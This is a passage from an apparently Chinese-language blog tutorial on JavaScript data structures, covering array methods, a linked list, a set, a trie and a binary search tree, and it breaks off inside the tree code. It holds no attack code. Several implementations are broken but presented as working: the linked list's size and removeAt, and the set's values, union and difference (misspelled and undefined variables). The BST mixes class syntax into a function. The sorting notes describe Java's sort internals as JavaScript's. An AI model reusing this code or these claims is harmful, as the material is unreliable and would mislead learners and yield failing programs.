<p>同时它还可以当作一个队列，队列的特点是先进先出，基本操作是出队和入队</p>
<p>甚至它还可以当作一个哈希表来使用(但是不推荐这么用)</p>
<p>源码里面说，JSArray 有两种模式，一种是快速的，一种是慢速的，快速的用的是索引直接定位，慢速的使用用哈希查找</p>
<p>JSArray 是继承于 JSObject</p>
<h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><p>push unshift splice</p>
<h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><p>pop shift splice</p>
<h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>arr[i] indexOf lastIndexOf includes find findIndex</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr.find(callback(element,index,array)[, thisArg])</span><br><span class="line">find方法对数组中的每一项元素执行一次 callback 函数，直至有一个 callback 返回 true。当找到了这样一个元素后，该方法会立即返回这个元素的值，否则返回 undefined。注意 callback 函数会为数组中的每个索引调用即从 0 到 length - 1，而不仅仅是那些被赋值的索引，这意味着对于稀疏数组来说，该方法的效率要低于那些只遍历有值的索引的方法。</span><br><span class="line">find方法不会改变数组。</span><br><span class="line">callback函数带有3个参数：当前元素的值、当前元素的索引，以及数组本身。</span><br><span class="line">findIndex() 方法，它返回数组中找到的元素的索引，而不是其值。</span><br></pre></td></tr></table></figure>

<h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><p>concat join reverse slice sort</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">arr.sort([compareFunction()])</span><br><span class="line">numbers.sort((a, b) =&gt; a - b); 从小到大</span><br><span class="line"></span><br><span class="line">sort方法用原地算法对数组的元素进行排序，并返回数组。排序算法现在是稳定的。默认排序顺序是根据字符串Unicode码点。</span><br><span class="line">快速排序和优化的归并排序</span><br><span class="line"></span><br><span class="line">快速排序主要是对哪些基本类型数据（int,short,long等）排序， 而合并排序用于对对象类型进行排序。使用不同类型的排序算法主要是由于快速排序是不稳定的，而合并排序是稳定的</span><br><span class="line"></span><br><span class="line">归并排序相对而言比较次数比快速排序少，移动（对象引用的移动）次数比快速排序多，而对于对象来说，比较一般比移动耗时。补充一点合并排序的时间复杂度是nlogn, 快速排序的平均时间复杂度也是nlogn，但是合并排序的需要额外的n个引用的空间。</span><br><span class="line"></span><br><span class="line">当待排序的数组中的元素个数较少时，源码中的阀值为7，采用的是插入排序。尽管插入排序的时间复杂度为0(n^2)，但是当数组元素较少时，插入排序优于快速排序，因为这时快速排序的递归操作影响性能。</span><br></pre></td></tr></table></figure>

<h4 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h4><p>every somefilter reduce map forEach</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">every() 方法测试一个数组内的所有元素是否都能通过某个指定函数的测试。它返回一个布尔值。</span><br><span class="line">numbers.every((a) =&gt; a&gt;10)</span><br><span class="line"></span><br><span class="line">some() 方法测试是否至少有一个元素可以通过被提供的函数方法。该方法返回一个Boolean类型的值。</span><br><span class="line">arr.some(callback(element[, index[, array]])[, thisArg])</span><br><span class="line"></span><br><span class="line">filter() 方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。</span><br><span class="line">var newArray = arr.filter(callback(element[, index[, array]])[, thisArg])</span><br><span class="line"></span><br><span class="line">reduce() 方法对数组中的每个元素执行一个由您提供的reducer函数(升序执行)，将其结果汇总为单个返回值。</span><br><span class="line">arr.reduce(callback(accumulator, currentValue[, index[, array]])[, initialValue])</span><br><span class="line">numbers.reduce(function(accumulator, currentValue, currentIndex, array)&#123;</span><br><span class="line">  return accumulator + currentValue;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">map() 方法创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数后返回的结果。</span><br><span class="line">var new_array = arr.map(function callback(currentValue[, index[, array]]) &#123;</span><br><span class="line"> // Return element for new_array</span><br><span class="line">&#125;[, thisArg])</span><br><span class="line"></span><br><span class="line">forEach() 方法对数组的每个元素执行一次提供的函数。</span><br><span class="line">arr.forEach(callback[, thisArg]);</span><br></pre></td></tr></table></figure>

<h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">function LinkedList()&#123;</span><br><span class="line"> let Node = function(element)&#123;</span><br><span class="line">  this.element = element;</span><br><span class="line">  this.next = null;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> let length = 0;</span><br><span class="line"> let head = null;</span><br><span class="line"></span><br><span class="line"> this.size = function()&#123;</span><br><span class="line">  return this.length</span><br><span class="line"> &#125;</span><br><span class="line"> this.isEmpty = function()&#123;</span><br><span class="line">  return this.length===0</span><br><span class="line"> &#125;</span><br><span class="line"> this.append = function(element)&#123;</span><br><span class="line">  let node = new Node(element),current;</span><br><span class="line">  if(head === null)&#123;</span><br><span class="line">   head = node;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">   current = head;</span><br><span class="line">   while(current.next)&#123;</span><br><span class="line">    current = current.next</span><br><span class="line">   &#125;</span><br><span class="line">   current.next = node;</span><br><span class="line">  &#125;</span><br><span class="line">  length++;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> this.insert = function(position,element)&#123;</span><br><span class="line">    var node = new Node(element);</span><br><span class="line">    var currentNode = head;</span><br><span class="line">    var previousNode;</span><br><span class="line">    var currentIndex = 0;</span><br><span class="line"></span><br><span class="line">    if (position &gt; length) &#123;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (position === 0) &#123;</span><br><span class="line">      node.next = currentNode;</span><br><span class="line">      head = node;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      while (currentIndex &lt; position) &#123;</span><br><span class="line">        currentIndex++;</span><br><span class="line">        previousNode = currentNode;</span><br><span class="line">        currentNode = currentNode.next;</span><br><span class="line">      &#125;</span><br><span class="line">      node.next = currentNode;</span><br><span class="line">      previousNode.next = node;</span><br><span class="line">    &#125;</span><br><span class="line">    length++;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> this.removeAt = function(position)&#123;</span><br><span class="line">  if(position &gt; -1 &amp;&amp; position &lt; length)&#123;</span><br><span class="line">   let current = head,previous,index=0;</span><br><span class="line">   if(position === 0)&#123;</span><br><span class="line">    head = current.next;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">    while(index++&lt;position)&#123;</span><br><span class="line">     previous = current;</span><br><span class="line">     current = current.next;</span><br><span class="line">    &#125;</span><br><span class="line">    length--;</span><br><span class="line">    return current.element;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">   return null;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> this.indexOf = function (element) &#123;</span><br><span class="line">  var currentNode = head;</span><br><span class="line">  var index = -1;</span><br><span class="line">  while (currentNode) &#123;</span><br><span class="line">   index++;</span><br><span class="line">   if (currentNode.element === element) &#123;</span><br><span class="line">    return index;</span><br><span class="line">   &#125;</span><br><span class="line">   currentNode = currentNode.next;</span><br><span class="line">  &#125;</span><br><span class="line">  return -1;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> this.remove = function(element)&#123;&#125;</span><br><span class="line"> this.getHead = function()&#123;&#125;</span><br><span class="line"> this.toString = function()&#123;</span><br><span class="line">  let current = head,string=&quot;&quot;;</span><br><span class="line">  while(current)&#123;</span><br><span class="line">   string+=current.element+(current.next?&quot; &quot;:&quot;&quot;);</span><br><span class="line">   current=current.next</span><br><span class="line">  &#125;</span><br><span class="line">  return string</span><br><span class="line"> &#125;</span><br><span class="line"> this.print = function()&#123;</span><br><span class="line">  return head</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><p>一组无序且唯一的项构成，键值相同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">function Set()&#123;</span><br><span class="line"> let items = &#123;&#125;</span><br><span class="line"> this.has = function(value)&#123;</span><br><span class="line">  return items.hasOwnProperty(value);</span><br><span class="line"> &#125;</span><br><span class="line"> this.add = function(value)&#123;</span><br><span class="line">  if(!this.has(value))&#123;</span><br><span class="line">   items[value] = value;</span><br><span class="line">   return true;</span><br><span class="line">  &#125;</span><br><span class="line">  return false;</span><br><span class="line"> &#125;</span><br><span class="line"> this.remove = function(value)&#123;</span><br><span class="line">  if(this.has(value))&#123;</span><br><span class="line">   delete items[value];</span><br><span class="line">   return true</span><br><span class="line">  &#125;</span><br><span class="line">  return false;</span><br><span class="line"> &#125;</span><br><span class="line"> this.clear=function()&#123;</span><br><span class="line">  items = &#123;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> this.size = function()&#123;</span><br><span class="line">  return Object.keys(items).length;</span><br><span class="line"> &#125;</span><br><span class="line"> this.values = function()&#123;</span><br><span class="line">  let values = [];</span><br><span class="line">  for(let i = 0,keys=Object.keys(items);i&lt;keys.length;++i)&#123;</span><br><span class="line">   values.push(itmes[keys[i]]);</span><br><span class="line">  &#125;</span><br><span class="line">  return values;</span><br><span class="line"> &#125;</span><br><span class="line"> //并集</span><br><span class="line"> this.union = function(otherSet)&#123;</span><br><span class="line">  let unionSet = new Set()</span><br><span class="line">  let valuse = this.values();</span><br><span class="line">  for(let i = 0;i&lt;values.length;++i)&#123;</span><br><span class="line">   unionSet.add(values[i])</span><br><span class="line">  &#125;</span><br><span class="line">  valuse = otherSet.values();</span><br><span class="line">  for(let i = 0;i&lt;values.length;++i)&#123;</span><br><span class="line">   unionSet.add(values[i])</span><br><span class="line">  &#125;</span><br><span class="line">  return unionSet;</span><br><span class="line"> &#125;</span><br><span class="line"> //交集</span><br><span class="line"> this.intersection = function(otherSet)&#123;</span><br><span class="line">  let intersectionSet = new Set()</span><br><span class="line">  let values = this.values()</span><br><span class="line">  for(let i = 0;i&lt;values.length;++i)&#123;</span><br><span class="line">   if(otherSet.has(values[i]))&#123;</span><br><span class="line">    intersectionSet.add(values[i])</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return intersectionSet</span><br><span class="line"> &#125;</span><br><span class="line"> //差集</span><br><span class="line"> this.difference = function(otherSet)&#123;</span><br><span class="line">  let differenceSet = new Set()</span><br><span class="line">  let values = this.values()</span><br><span class="line">  for(let i = 0;i&lt;values.length;++i)&#123;</span><br><span class="line">   if(!otherSet.has(values[i]))&#123;</span><br><span class="line">    intersectionSet.add(values[i])</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return differenceSet</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Trie-字典-映射-未完"><a href="#Trie-字典-映射-未完" class="headerlink" title="Trie 字典/映射(未完)"></a>Trie 字典/映射(未完)</h3><p><img src="../images/v2-66fe051619d2c399a30bbcb5fbd0e9f4_hd.jpg#id=O6I15&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>Trie 也可以叫做 Prefix Tree（前缀树），也是一种搜索树。Trie 分步骤存储数据，树中的每个节点代表一个步骤，trie 常用于存储单词以便快速查找，比如实现单词的自动完成功能。 Trie 中的每个节点都包含一个单词的字母，跟着树的分支可以可以拼写出一个完整的单词，每个节点还包含一个布尔值表示该节点是否是单词的最后一个字母。</p>
<p>Trie 一般有以下方法：</p>
<ol>
<li><code>add</code>：向字典树中增加一个单词</li>
<li><code>isWord</code>：判断字典树中是否包含某个单词</li>
<li><code>print</code>：返回字典树中的所有单词</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Trie的节点</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Node</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">keys</span> = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">end</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">setEnd</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">end</span> = <span class="literal">true</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isEnd</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">end</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Trie</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">root</span> = <span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">add</span> = <span class="keyword">function</span> (<span class="params">input, node = <span class="variable language_">this</span>.root</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (input.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">      node.<span class="title function_">setEnd</span>();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!node.<span class="property">keys</span>.<span class="title function_">has</span>(input[<span class="number">0</span>])) &#123;</span><br><span class="line">      node.<span class="property">keys</span>.<span class="title function_">set</span>(input[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Node</span>());</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">add</span>(input.<span class="title function_">substr</span>(<span class="number">1</span>), node.<span class="property">keys</span>.<span class="title function_">get</span>(input[<span class="number">0</span>]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">add</span>(input.<span class="title function_">substr</span>(<span class="number">1</span>), node.<span class="property">keys</span>.<span class="title function_">get</span>(input[<span class="number">0</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isWord</span> = <span class="keyword">function</span> (<span class="params">word</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> node = <span class="variable language_">this</span>.<span class="property">root</span>;</span><br><span class="line">    <span class="keyword">while</span> (word.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!node.<span class="property">keys</span>.<span class="title function_">has</span>(word[<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        node = node.<span class="property">keys</span>.<span class="title function_">get</span>(word[<span class="number">0</span>]);</span><br><span class="line">        word = word.<span class="title function_">substr</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node.<span class="property">keys</span>.<span class="title function_">has</span>(word) &amp;&amp; node.<span class="property">keys</span>.<span class="title function_">get</span>(word).<span class="title function_">isEnd</span>() ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">print</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> words = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">let</span> search = <span class="keyword">function</span> (<span class="params">node = <span class="variable language_">this</span>.root, string</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (node.<span class="property">keys</span>.<span class="property">size</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> letter <span class="keyword">of</span> node.<span class="property">keys</span>.<span class="title function_">keys</span>()) &#123;</span><br><span class="line">          <span class="title function_">search</span>(node.<span class="property">keys</span>.<span class="title function_">get</span>(letter), string.<span class="title function_">concat</span>(letter));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (node.<span class="title function_">isEnd</span>()) &#123;</span><br><span class="line">          words.<span class="title function_">push</span>(string);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        string.<span class="property">length</span> &gt; <span class="number">0</span> ? words.<span class="title function_">push</span>(string) : <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">search</span>(<span class="variable language_">this</span>.<span class="property">root</span>, <span class="keyword">new</span> <span class="title class_">String</span>());</span><br><span class="line">    <span class="keyword">return</span> words.<span class="property">length</span> &gt; <span class="number">0</span> ? words : <span class="literal">null</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="散列表-MAP"><a href="#散列表-MAP" class="headerlink" title="散列表 MAP"></a>散列表 MAP</h3><p>通过一个特定散列函数处理值得到独一无二的键实现快速查找，但开的空间比较大</p>
<h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><p>Tree 的数据结构和自然界中的树极其相似，有根、树枝、叶子，如上图所示。Tree 是一种多层数据结构，与 Array、Stack、Queue 相比是一种非线性的数据结构，在进行插入和搜索操作时很高效。在描述一个 Tree 时经常会用到下列概念：</p>
<ol>
<li>Root（根）：代表树的根节点，根节点没有父节点</li>
<li>Parent Node（父节点）：一个节点的直接上级节点，只有一个</li>
<li>Child Node（子节点）：一个节点的直接下级节点，可能有多个</li>
<li>Siblings（兄弟节点）：具有相同父节点的节点</li>
<li>Leaf（叶节点）：没有子节点的节点</li>
<li>Edge（边）：两个节点之间的连接线</li>
<li>Path（路径）：从源节点到目标节点的连续边</li>
<li>Height of Node（节点的高度）：表示节点与叶节点之间的最长路径上边的个数</li>
<li>Height of Tree（树的高度）：即根节点的高度</li>
<li>Depth of Node（节点的深度）：表示从根节点到该节点的边的个数</li>
<li>Degree of Node（节点的度）：表示子节点的个数</li>
</ol>
<p>我们以二叉查找树为例，展示树在 Javascript 中的实现。在二叉查找树中，即每个节点最多只有两个子节点，而左侧子节点小于当前节点，而右侧子节点大于当前节点，如图所示：</p>
<p><img src="../images/v2-c725ef08bd202fba49713829c7f1fff5_hd.jpg#id=ZWj8u&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>一个二叉查找树应该具有以下常用方法：</p>
<ol>
<li>insert：向树中插入一个节点</li>
<li><code>findMin</code>：查找树中最小的节点</li>
<li><code>findMax</code>：查找树中最大的节点</li>
<li><code>find</code>：查找树中的某个节点</li>
<li><code>isPresent</code>：判断某个节点在树中是否存在</li>
<li><code>remove</code>：移除树中的某个节点</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">function BinarySearchTree()&#123;</span><br><span class="line"> let Node = function(key)&#123;</span><br><span class="line">  this.key = key;</span><br><span class="line">  this.left = null;</span><br><span class="line">  this.right = null;</span><br><span class="line"> &#125;</span><br><span class="line"> let root = null;</span><br><span class="line"> let insertNode = function(node,newNode)&#123;</span><br><span class="line">  if(newNode.key &lt; node.key)&#123;</span><br><span class="line">   if(node.left === null)&#123;</span><br><span class="line">    node.left = newNode</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">    insertNode(node.left,newNode);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">   if(node.right===null)&#123;</span><br><span class="line">    node.right = newNode;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">    insertNode(node.right,newNode);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> this.insert = function(key)&#123;</span><br><span class="line">  let newNode = new Node(key);</span><br><span class="line">  if(root === null)&#123;</span><br><span class="line">   root = newNode;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">   insertNode(root,newNode);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> findMin() &#123;</span><br><span class="line">    let current = this.root;</span><br><span class="line">    while (current.left !== null) &#123;</span><br><span class="line">      current = current.left;</span><br><span 